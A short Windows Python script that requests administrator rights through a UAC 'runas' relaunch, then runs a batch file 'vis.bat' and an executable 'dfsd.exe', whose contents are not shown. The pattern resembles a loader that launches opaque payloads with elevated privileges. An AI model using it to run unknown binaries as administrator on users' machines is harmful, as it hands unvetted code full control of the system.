import os
import sys
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)

def main():
    bat_file = "vis.bat"
    exe_file = "dfsd.exe"
    os.system(bat_file)
    os.startfile(exe_file)
  
if __name__ == "__main__":
    if is_admin():
        main()
    else:
        run_as_admin()